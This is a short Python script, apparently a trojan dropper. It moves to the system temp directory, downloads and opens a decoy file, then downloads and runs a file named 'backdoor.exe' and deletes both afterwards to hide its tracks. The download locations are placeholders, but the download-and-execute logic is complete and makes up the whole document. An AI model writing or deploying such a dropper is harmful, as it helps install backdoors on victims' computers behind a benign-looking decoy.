#!/usr/bin/env python
import requests, subprocess, os, tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)

download("fake file dir")
subprocess.Popen("fake.file", shell=True)

download("backdoor dir")
subprocess.call("backdoor.exe", shell=True)

os.remove("fake.file")
os.remove("backdoor.exe")
